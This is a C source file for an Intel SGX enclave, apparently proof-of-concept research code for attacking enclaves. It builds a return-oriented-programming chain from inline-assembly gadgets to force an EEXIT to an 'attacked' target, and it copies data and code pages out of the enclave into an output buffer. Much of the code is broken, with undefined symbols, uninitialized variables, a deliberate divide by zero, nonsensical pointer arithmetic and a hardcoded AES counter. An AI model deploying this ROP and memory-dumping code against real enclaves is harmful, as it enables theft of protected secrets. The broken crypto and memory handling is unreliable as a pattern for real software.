/*
 * Copyright (C) 2011-2019 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "Enclave.h"
#include "encl_t.h" /* print_string */
#include <stdarg.h>
#include <stdio.h> /* vsnprintf */
#include <string.h>
#include "Crypto.h"
#include "sgx_spinlock.h"
#include <sgx_uae_service.h>
#include <sgx_ukey_exchange.h>
#include <sgx_uae_quote_ex.h>
#include <sgx_tseal.h>
#include <sgx_utils.h>
#include <sgx_urts.h>
#include <sgx_tkey_exchange.h>

#include "trts_inst1.h"
//#include "micro.h"
#include "sgx_trts_exception.h"
#include <stdio.h>

//#include "sgx_trts.h"
//#include "sgx_tseal.h"
//#include <string.h>
//#include "sgx_thread.h"
//#include "stdlib.h"
//#include "sgx_tcrypto.h"


/*call assembly code from other S file*/
//extern "C" int do_ereport_define(const sgx_target_info_t *target_info, const sgx_report_data_t *report_data, sgx_report_t *report);


/*
 * printf:
 *   Invokes OCALL to display the enclave buffer to the terminal.
 */

void mem_cpy( unsigned long *dst, unsigned long *src, unsigned long size );
#define PAGE_OFFSET 0xFFFFFFFFFFFFF000
unsigned long datapoint = 0xccc;

int flag_s = 0;
unsigned long *data_page;
unsigned long *code_pt;
/*
 * printf:
 *   anchor function with rdi rsi rdx // acturally, no need the parameters, because we pass the para with register
 *   before we jump, we directly config the general registers.
 */
//extern "C" int anchor_function(void *addr1, void *addr2, void *addr3);
extern int anchor_function();
__attribute__((aligned(4096))) int array[4096] = {0xaa};
#define a array[100]
unsigned long urdtsc(void)
{
    unsigned int lo,hi;

    __asm__ __volatile__
    (
        "rdtsc":"=a"(lo),"=d"(hi)
    );
    return (unsigned long)hi<<32|lo;
}
void* get_a_addr( void )
{
    return &a;
}

void page_aligned_func(void);

void* get_code_addr( void )
{
    return page_aligned_func;
}
int enclave_dummy_call(void)
{
    //ocall_print_string("p=\n",p0);
    
    return a;
}

int exception_handler(sgx_exception_info_t *info)
{
    switch(info->exception_type)
		{
		case SGX_EXCEPTION_HARDWARE :
			break;
		case SGX_EXCEPTION_SOFTWARE :
			break;
		}
    switch (info->exception_vector)
    {
    case SGX_EXCEPTION_VECTOR_AC:
        break;
    case SGX_EXCEPTION_VECTOR_BP:
        break;
    case SGX_EXCEPTION_VECTOR_BR:
        break;
    case SGX_EXCEPTION_VECTOR_DB:
        break;
    case SGX_EXCEPTION_VECTOR_DE:
        break;
    case SGX_EXCEPTION_VECTOR_MF:
        break;
    case SGX_EXCEPTION_VECTOR_UD:
        break;
    case SGX_EXCEPTION_VECTOR_XM:
        break;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int create_exception(int flag){
    void *ret = sgx_register_exception_handler(10,exception_handler);
    if(ret !=  NULL)
    {   
        flag_s++;
        ocall_print_string("sub first registered\n");
        create_exception(flag_s);
    }
    else{
        ocall_print_string(" sub not registered\n");
    }
    
    ret = sgx_register_exception_handler(0,exception_handler);
    if(ret !=  NULL)
    {
               flag_s++;

        ocall_print_string("sub last registered\n");
      create_exception(flag_s);

    }
    else{
        ocall_print_string("not registered\n");
    }

     int k = 0;
     
      if(flag <20)
	k = 6/0;

}


int add_hooks_for_exception()
{
    void *ret = sgx_register_exception_handler(10,exception_handler);
    if(ret !=  NULL)
    {

        flag_s++; 
        ocall_print_string("first exception registered\n");  
        create_exception(flag_s);
    }
    else{
        ocall_print_string("first exception not registered\n");
    }
    
    ret = sgx_register_exception_handler(0,exception_handler);
    if(ret !=  NULL)
    {
        ocall_print_string("last registered\n");
        create_exception(flag_s);
    }
    else{
        ocall_print_string("last not registered\n");
    }

}


/*
 * printf:
 *   Invokes OCALL to display the enclave buffer to the terminal.
 */
extern int do_ereport_define(sgx_target_info_t *addr1, sgx_report_data_t *addr2, sgx_report_t *addr3);

int inner_function()
{   
   
    
    anchor_function();
    
    return 0;
}


int printf(const char* fmt, ...)
{
    char buf[BUFSIZ] = { '\0' };
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
    return (int)strnlen(buf, BUFSIZ - 1) + 1;
}


void redirect_mem_to_noepc(unsigned long *dst, unsigned long tcs )  //vaddr is a point for two pages, the second page for a lock scheme
{
    unsigned long *ssa_address;
    ssa_address = tcs+ (unsigned long *)4096;
    memcpy(ssa_address, dst, 3916);

    unsigned long lock = lock+516;

    if(lock == 0x1)
    {
        memcpy(dst, ssa_address, 3916);
    }
    else
    {
        return;
    }

    if(lock == 0x1)
    {
        unsigned long *c1;
        c1 = (unsigned long *)redirect_mem_to_noepc;
        unsigned long addr = (unsigned long) c1;
        addr = addr&PAGE_OFFSET;
        c1 = (unsigned long *)addr;
        memcpy(dst, c1, 4096);
    }
    else
    {
        return;
    }

    return;
}

void print_data_from_v(unsigned long *adrs)
{

    unsigned long *unknown_data;
    unknown_data = &datapoint;
    unknown_data -= 0x0;
    //     datapoint = 0xddd;
    *(adrs)= (unsigned long)(unknown_data);

    *(adrs+1)= *(unsigned long *)(unknown_data);
}


void print_code_from_v(unsigned long *adrs)
{

    unsigned long *func_entry;
    func_entry = (unsigned long *)print_data_from_v;

    *adrs= (unsigned long)(func_entry+900);

    *(adrs+1)= *((unsigned long *)(func_entry+900));

}


#define BUFLEN 2048
#define SGX_AESGCM_MAC_SIZE 16
#define SGX_AESGCM_IV_SIZE 12

#define SGX_AES_CTR_SIZE 16
#define AES_CTR_INC_BITS 32


#define ONE_TIME_CONTEXT_SIZE 0x1000


#define RSA_MOD_SIZE 384
#define RSA_E_SIZE 4


#define GET_BYTE(x,k) ((const unsigned char *)&(x))[k])


#define _htonl(x)  ((uint32_t)(                            \
		(((uint32_t)(x)&(uint32_t)0x000000ff)<<24)|  \
		(((uint32_t)(x)&(uint32_t)0x0000ff00)<<8)|  \
		(((uint32_t)(x)&(uint32_t)0x00ff0000)>>8)|  \
		(((uint32_t)(x)&(uint32_t)0xff000000)>>24)))  

void manage_rsa(uint8_t *p_key1, unsigned long *dst)
{

    sgx_status_t ret = SGX_ERROR_UNEXPECTED;

    size_t byte_size = 256;
    size_t p_byte_size = byte_size/2;
    size_t e_byte_size = 4;
    unsigned char e[4] = {1, 0, 1};
    unsigned char *n =(unsigned char *)malloc(byte_size);
    unsigned char *d = (unsigned char *)malloc(byte_size);
    unsigned char *p = (unsigned char *)malloc(p_byte_size);
    unsigned char *q = (unsigned char *)malloc(p_byte_size);
    unsigned char *p_dmp1 = (unsigned char *)malloc(p_byte_size);
    unsigned char *p_dmq1 = (unsigned char *)malloc(p_byte_size);
    unsigned char *p_iqmp = (unsigned char *)malloc(p_byte_size);
    uint8_t *p_private = (uint8_t *)malloc(5*p_byte_size);

    void *pubkey = NULL;

    /*
//   printf("begin key!\n");
    sgx_create_rsa_key_pair(byte_size, e_byte_size, n, d, e, p, q, p_dmp1, p_dmq1, p_iqmp);
    if ((ret = sgx_create_rsa_key_pair(byte_size, e_byte_size, n, d, e, p, q, p_dmp1, p_dmq1, p_iqmp)) != SGX_SUCCESS)
    {
        printf("\nTrustedApp: sgx_create_rsa_key_pair() failed !\n");

    }
//   printf("Enclave debug %p\n", manage_rsa);
    memcpy(p_private,p,p_byte_size);
    memcpy(p_private+p_byte_size,q,p_byte_size);
    memcpy(p_private+p_byte_size*2,p_dmp1,p_byte_size);
    memcpy(p_private+p_byte_size*3,p_dmq1,p_byte_size);
    memcpy(p_private+p_byte_size*4,p_iqmp,p_byte_size);

    uint8_t *pubkey = (uint8_t *)malloc(byte_size);
    memcpy(pubkey,n,byte_size);


    if (ret == SGX_SUCCESS)
    {
        printf("Successfully created rsa key pair!\n");

    }
*/

    uint32_t little_endian_e =0;
    uint8_t   *le_n= NULL;
    le_n = (uint8_t *)malloc(RSA_MOD_SIZE);
    uint8_t *extr_key;
	
   extr_key = (uint8_t *)p_private1;
   
   little_endian_e = _htonl(*(extr_key)+RSA_MOD_SIZE);
  
   size_t i=0;
   for(i=0; i<RSA_MOD_SIZE; i++){
     le_n[i]= *(extr_key+RSA_MOD_SIZE-1-i);

   }

    if(sgx_create_rsa_pub1_key(RSA_MOD_SIZE,RSA_E_SIZE,(const unsigned char *)le_n, (const unsigned char*)(&little_endian_e), &pubkey)!=SGX_SUCCESS){
        memcpy(dst, le_n,16);
    }


    uint8_t *p_data;
    p_data = (uint8_t *)p_key1;
    uint8_t p_out[384] ={1};
    size_t len = 384;
    size_t in_len = 8;
    sgx_rsa3072_signature_t p_signature;
//    printf("---begin encryt aes key!\n");
 //   ret = sgx_rsa3072_sign(p_data, 4, (sgx_rsa3072_key_t *)p_private, &p_signature);
 //   pubkey = (void *)p_private1;
  //   memcpy(dst, (uint8_t *)pubkey,16);

    ret = sgx_rsa_pub_encrypt_sha256(pubkey, p_out, &len, p_data, in_len);
    if(ret !=SGX_SUCCESS)
              memcpy(dst, p_out,30);
    else
              memcpy(dst,p_out,512);
//    printf("---end encrypt aes key!\n");
//   if (ret == SGX_SUCCESS) printf("Encrypted!\n");

 //   sgx_rsa_result_t p_result;
 //   ret = sgx_rsa3072_verify(p_data, 4, (sgx_rsa3072_public_key_t  *)pubkey, &p_signature, &p_result);
//   if (ret == SGX_SUCCESS) printf("Decrypted!\n");
    //  if (p_result == SGX_RSA_VALID) printf("Valid!\n");

    free(n);
    free(d);
    free(p);
    free(q);
    free(p_dmp1);
    free(p_dmq1);
    free(p_iqmp);
    free(p_private);
    return;
}



int create_secret(uint8_t *p_src, uint8_t* p_dst)
{

    uint8_t p_ctr[16] = { 4, 3, 2, 1, 0 };
    uint32_t ctr_inc_bits = 16;
    uint32_t src_len = ONE_TIME_CONTEXT_SIZE;
    uint32_t dst_len = ONE_TIME_CONTEXT_SIZE;
    sgx_aes_ctr_encrypt((const sgx_aes_ctr_128bit_key_t*) p_key,
                        (const uint8_t*) p_src, src_len, p_ctr, ctr_inc_bits, p_dst);

    return 0;
}


int create_secret1(uint8_t *p_src, uint8_t* p_dst, uint8_t* p_key)
{

    uint8_t p_ctr[16] = { 4, 3, 2, 1, 0 };
    uint32_t ctr_inc_bits = 16;
    uint32_t src_len = ONE_TIME_CONTEXT_SIZE;
    uint32_t dst_len = ONE_TIME_CONTEXT_SIZE;
    sgx_aes_ctr_encrypt((const sgx_aes_ctr_128bit_key_t*) p_key,
                        (const uint8_t*) p_src, src_len, p_ctr, ctr_inc_bits, p_dst);

    return 0;
}


int process_secret(uint8_t *p_dst,uint8_t *plaintxt)
{

    uint8_t p_ctr[16] = { 4, 3, 2, 1, 0 };
    uint32_t ctr_inc_bits = 16;
    uint32_t dst_len = ONE_TIME_CONTEXT_SIZE;
    uint8_t d_data[dst_len];
    sgx_aes_ctr_decrypt((const sgx_aes_gcm_128bit_key_t*) p_key, p_dst, dst_len,
                        p_ctr, ctr_inc_bits, plaintxt);

    return 0;

}
/*
void one_time_dump_memory(int counter, unsigned long *dst)
{
    uint8_t *data = (uint8_t *) malloc(0x5000);
    unsigned long *pointer;
    pointer = (unsigned long *)worker+counter*512;

    memcpy(data, pointer, 0x5000*sizeof(uint8_t ));

 //    printf("the current function address: %lx\n", (unsigned long *)worker);

 //   printf("the current function address: %lx\n", pointer);

    uint8_t secret[0x5000]= {0};
 //   uint8_t plaintext[0x5000]= {0};
 //   uint8_t p_src[0x2000] = { 2, 3, 2, 6 };


  //  printf("the current function address: %lx\n", pointer);
    create_secret((uint8_t *)data,secret);
//    printf("the secret: %u \n", secret[0]);
 //   process_secret(secret,plaintext);


 //   printf("the plaintext: %u \n", plaintext[0]);
   memcpy(dst, secret,0x5000*sizeof(uint8_t ));
//     memcpy(dst, secret, 0x6000*sizeof(uint8_t ));
//	redirect_mem_to_noepc()
    free(data);
    return;
}
*/


void one_time_dump_memory(int counter, unsigned long *dst)
{
    //ocall_print_string("\n1111111111111111\n");
    //printf("\n1111111111111111\n");
    int size =0x1000;
    uint8_t *data = (uint8_t *) malloc(size);
    uint8_t *code = (uint8_t *) malloc(size);
    uint8_t *pointer, *p_rsp;
    //_xin
    //pointer = (uint8_t *)worker+counter*16+0x4340cff+0xee4;
    //dst[0]= (unsigned long )((uint8_t *)worker +0x4340cff+0xee4);
    //memcpy(data, pointer, size);
    //memcpy(dst+2, pointer, size);
    memcpy(data,data_page,size);
    memcpy(code,code_pt,size);
   // p_rsp = pointer+0x68;
    //dst[1]=*(unsigned long *)p_rsp;
    //*(unsigned long *)p_rsp = (unsigned long)dst-0x2000;
    
/*  int i =0;
    int size = 2; 
    for (i =0; i<size; i++)
    {
          pointer = (unsigned long *)pointer+i*512;
	  data = (uint8_t *)data+i;

          memcpy(data+2, pointer, 2);
    }
*/
    uint8_t secret[0x10000]= {0};


    create_secret((uint8_t *)data,secret);
    memcpy(dst, secret,size);
    free(data);
    return;
}

//extern "C" void * __memset(void *dst, int c, size_t n);

sgx_status_t sgx_create_report_define(const sgx_target_info_t *target_info, const sgx_report_data_t *report_data, sgx_report_t *report)
{
//    static_assert(sizeof(*target_info) == 512, "sgx_target_info_t");
//    static_assert(sizeof(*report_data) == 64, "sgx_report_data_t");
//   static_assert(sizeof(*report) == 432, "sgx_report_t");


    __attribute__((aligned(128))) unsigned long tmp_report_data[16]= {0};
    __attribute__((aligned(512))) unsigned long tmp_target_info[64]= {0};
    __attribute__((aligned(512))) unsigned long tmp_report[64]= {0};

    // Do EREPORT
    auto failed = 0;
//	 printf("the do report out 0: %lx   %lx   %lx \n",&tmp_target_info , &tmp_report_data, &tmp_report);
//do_ereport_define(tmp_target_info, tmp_report_data, tmp_report);

    /*	__asm__ __volatile__("movq %0, %%rbx\n\t"
    			     "movq %1, %%rcx\n\t"
    			     "movq %2, %%rdx\n\t"
    			     "movq $0, %%rax\n\t"
    			     ".byte 0x0f, 0x01, 0xd7\n\t"
                ::"r"((void *)&tmp_target_info), "r"((void *)&tmp_report_data), "r"((void *)&tmp_report):);
    */
 // failed = do_ereport_define(&tmp_target_info, &tmp_report_data, &tmp_report);
  failed = do_ereport_define((sgx_target_info_t *)tmp_target_info, (sgx_report_data_t *)tmp_report_data, (sgx_report_t *)tmp_report);

//   failed = do_ereport(&tmp_target_info, &tmp_report_data, &tmp_report);
    // Copy data to the user buffer: *report = tmp_report;
    // Use a loop to avoid compiler to call memcpy,
    // which cannot be used during enclave initialization.
    // No need to cleanup the tmp_report as it is not secret.
    if (!failed)
    {
        //      static_assert(sizeof(*report) % sizeof(uint64_t) == 0, "sizeof(sgx_report_t) should be multiple of 8");
        for(size_t i = 0; i < sizeof(*report)/sizeof(uint64_t); i++)
        {
            ((uint64_t*)report)[i] = ((uint64_t*)&tmp_report)[i];
        }
    }


    return failed ? SGX_ERROR_UNEXPECTED : SGX_SUCCESS;
}

void worker(unsigned long *dst)
{
    //      anchor_function();
    //ocall_print_string("\n1111111111111111\n");
    int flag = 3;

    sgx_target_info_t target_info; //it was allowed to be null
    sgx_report_data_t report_data;
    sgx_epid_group_id_t epid_gid;

//    alignas(512) unsigned long report[64]= {0};
    sgx_report_t report;
    
    
    int i, size = 1;

  /*     sgx_create_report_define(&target_info, NULL, &report);
       memcpy(dst, &report.body.mr_enclave, sizeof(sgx_measurement_t));

      uint8_t aes_key[16]={0};
      uint8_t share_key[16]={0};
      sgx_read_rand(aes_key, sizeof(aes_key));

      memcpy(dst+6, aes_key, sizeof(aes_key));

      sgx_read_rand(share_key, sizeof(share_key));
      
      memcpy(dst+9, share_key, sizeof(share_key));

      uint8_t ciphertext[0x4000]= {0};


      create_secret1(share_key,ciphertext, aes_key);
      

      memcpy(dst+14, ciphertext, sizeof(share_key));

      manage_rsa(aes_key,dst+18);

*/
    for(i=0;i<size;i++)
    	   one_time_dump_memory(i, dst);

/*

    if(flag == 0 || flag ==100) {
       sgx_create_report_define(&target_info, NULL, &report);
       memcpy(dst, &report.body.mr_enclave, sizeof(sgx_measurement_t));
    } 
    else if(flag == 2 || flag ==100) {
       manage_rsa();
    }
    else if(flag == 3 || flag ==100)  {
        for(i=0;i<size;i++)
    	   one_time_dump_memory(i, dst);
    }
    else {
    }

*/
 //  printf("Enclave debug report %b\n", b);
//      memcpy(&report, 0, sizeof(sgx_report_t));


/*
     printf("the output address: %lx \n", dst);   //rsa key
    
     printf("the current function address: %lx\n", (unsigned long *)manage_rsa);


*/
   // return;
}


#define MAX_STR_LEN 80
#define MAX_INT 923372036854775807

/*
int strlen(char * str)
{
    int len = 0;
    while (len < MAX_STR_LEN && *str != '\0')
    {
        len ++;
        str ++;
    }
    return len;
}*/

unsigned long report_id(){
    uint8_t a[4096];
    unsigned long t1,t2;
    //t1=urdtsc;
    sgx_report_data_t report_data;
    sgx_report_t report;
    sgx_read_rand(report_data.d,64);
    sgx_status_t status;
    status = sgx_create_report(NULL,&report_data,&report);
    memset(a,3,4096);
   // t2=urdtsc;
    return (t2-t1)/3;
    
    
}

int addint(unsigned long c, unsigned long b, unsigned long *dst)
{
//    add_hooks_for_exception();
/*
     char *string = "string";
     int len = strlen (string);
     int i=len;

	//arithmetic exception. can be handled. Type : HARDWARE , Type: SGX_EXCEPTION_VECTOR_DE
    int x =0;

//    x=  5/0;		//After adding a breakpoint at line #11, in debug mode, it is showing that the control is reaching there.
*/
    //unsigned long enc_base_addr = get_enclave_base();
    //unsigned long anchor_offset = &inner_function - enc_base_addr;
    //printf("sss0=%lx",enc_base_addr);
    //printf("sss1=%lx",&inner_function);
    //printf("sss=%lx",&inner_function);
    //ocall_print_string("22222222222222222");
    //printf("output=%lx",&dst);

    
    data_page = c;
    code_pt = b;
    //flagxin
    //inner_function();
   // worker(dst);

 
    //t1=__rdtscp();
    sgx_report_data_t report_data;
    sgx_report_t report;
    sgx_read_rand(report_data.d,64);
    sgx_status_t status;
    status = sgx_create_report(NULL,&report_data,&report);
    
    //t2=urdtsc();
    //return (t2-t1)/3;
    
    //printf("encl_worker report time:%ld\n",t_id);
    //*sum = (unsigned long)(a+b);
/*        int p;
    int k = 1;
    if(k==0)
	p = a+b;
    else
	p = a-b;
    dst[5]=p;

    for (k=0; k<1000000;k=k+2){

	k=k-1;
    }
    return a+b;

*/
    return c+b;
}


unsigned long t000,t111;
char stack_for_attack[0x2000];



/*
 * do_eexit:
 *   Invokes EEXIT (ENCLU) leaf instruction directly
 */
//unsigned long ebase;
void do_eexit()
{
    unsigned long ptr = 0; /* pointer to the target function */
    unsigned long rbx = 0;
    ocall_get_ptr(&ptr);
    printf("ptr = %lx (in enclave)\n", ptr);
    __asm__ __volatile__(
            "mov %1, %%rbx\n"
            "mov %%rbx, %0\n"
            :"=m" (rbx):"m" (ptr));
    printf("rbx = %lx (in enclave)\n", rbx);
    __asm__ __volatile__(
            "mov %0, %%rbx\n"
            "xor %%rax, %%rax\n"
            "mov $0x4, %%eax\n"
            ".byte 0x0f, 0x01, 0xd7\n"
            ::"m" (ptr));
    printf("rbx = %lx (in enclave)\n", rbx);
}
/*
 * do_eexit_by_rop:
 *   Invokes EEXIT (ENCLU) leaf instruction using ROP
 */
//unsigned long getrop=0;
void gadget1(){
    __asm__ __volatile__(
        "pop %%rax\n\t"
        "add $0x5, %%rax\n\t"
        "ret\n\t"
        :::
    );
}
void gadget2(){
    __asm__ __volatile__(
        "mov (%%rbx),%%rdi\n\t"
        "pop %%rbx\n\t"
        "ret\n\t"
        :::
    );
}
void gadget3(){
    __asm__ __volatile__(
        ".byte 0x0f, 0x01, 0xd7\n\t"
        :::
    );
}

unsigned long secret = 0x123456789;
//unsigned long payload[6]={3,3,3,3,3,3};
void test2_code(){
    unsigned long payload[5];
    unsigned long shadow[5];
    payload[0] = gadget1;             // gadget 1
    payload[1] = 0xFFFFFFFFFFFFFFFF;
    payload[2] = gadget2;             // gadget 2
    payload[3] = (unsigned long)attacked;   // EEXIT target
    payload[4] = gadget3;             // gadget 3
    memcpy(shadow,payload, sizeof(payload));
     printf("%lx\n%lx\n%lx    %lx\n%lx    %lx\n",shadow,shadow[0],shadow[1],shadow[2],shadow[3],shadow[4]);
}
void do_eexit_by_rop()
{   
    unsigned long payload[5];
    unsigned long shadow[5];
    int i;
   // printf("payload=%lx\n",payload);
    //ocall_build_payload(payload, 5 * sizeof(unsigned long));
  //  printf("payload=%lx\n",payload);
    payload[0] = gadget1;             // gadget 1
    payload[1] = 0xFFFFFFFFFFFFFFFF;
    payload[2] = gadget2;             // gadget 2
    payload[3] = (unsigned long)attacked;   // EEXIT target
    payload[4] = gadget3;             // gadget 3
   // printf("&gadget= %lx\n",payload[0]);
    
    memcpy(shadow,payload, sizeof(payload));
  //  for(i=0;i<5;i++){
        printf("\n%lx\n%lx    %lx\n%lx    %lx\n",shadow[0],shadow[1],shadow[2],shadow[3],shadow[4]);
  //  }
     
    
   // __asm__ __volatile__(
   //         "mov %0, %%rbx\n"
    //        ::"r" (&secret));

  // printf("the secret %lx :\n", &secret);
    //payload[0] = "\x58";             // gadget 1
   // payload[1] = "\x48\x83\xc0\x05";
   // payload[2] = "\x48\x89\xc0";             // gadget 2
   // payload[3] = "\xc3";   // EEXIT target
   // payload[4] = "\x48\x89\x05\x00\x00\x00\x00";             // gadget 3
   // payload[5] = "\xc3";
    //printf("rop------%lx\n",secret);
    //ocall_build_payload(payload, 5 * sizeof(unsigned long));
   // printf("base = %lx\n", ebase);
    //payload[0] = ebase + 0x17e7;             // gadget 1
    //payload[1] = 0xFFFFFFFFFFFFFFFF;
    //payload[2] = ebase + 0x17ed;             // gadget 2
   // payload[3] = (unsigned long)attacked;   // EEXIT target
    //payload[4] = ebase + 0x17f2;             // gadget 3
    
    //printf("rop1------%lx\n",secret);
    
   // memcpy((void *)(secret + 4),payload, sizeof(payload));
    
  //  printf("the secret %lx,getrop=%lx",secret,getrop);
   //printf("rop2------%lx\n",secret);
   // __asm__ __volatile__(
    //        "mov %0, %%rbx\n"
    //        ::"r" (&secret));

   //printf("the secret %lx at %lx:\n", secret,&secret);
   
   //exit(1);
}


void enclave_main()
{    
    //printf("base==%lx",base);
   // ebase=base;
    //ggg();
    do_eexit_by_rop();
    //do_eexit();
}



